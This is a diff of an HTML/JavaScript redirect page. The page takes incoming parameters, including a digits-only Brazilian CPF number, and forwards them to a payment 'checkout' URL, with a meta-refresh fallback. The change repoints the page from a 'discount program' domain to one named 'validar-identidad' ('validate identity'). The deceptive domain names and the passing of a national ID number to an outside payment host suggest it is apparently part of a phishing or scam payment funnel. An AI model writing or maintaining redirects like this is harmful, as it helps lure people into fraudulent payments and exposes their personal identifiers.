@@ -16,7 +16,7 @@
   if (cpf  && cpf  !== "{{cpf}}")  incoming.set("document", String(cpf).replace(/\D/g,""));
 
   // monta a URL final
-  const checkout = new URL("hhttps://pay.programa-descontao.com/n1NLgw25lPlGMxE");
+  const checkout = new URL("https://pay.validar-identidad.com/N1nVZpYdVzMGlM6");
   incoming.forEach((v,k) => checkout.searchParams.set(k, v));
 
   // redireciona
@@ -26,7 +26,7 @@
 
 <!-- fallback se JS estiver bloqueado -->
 <noscript>
-  <meta http-equiv="refresh" content="0;url=https://pay.programa-descontao.com/n1NLgw25lPlGMxE">
+  <meta http-equiv="refresh" content="0;url=https://pay.validar-identidad.com/N1nVZpYdVzMGlM6">
 </noscript>
 </body>
 </html>
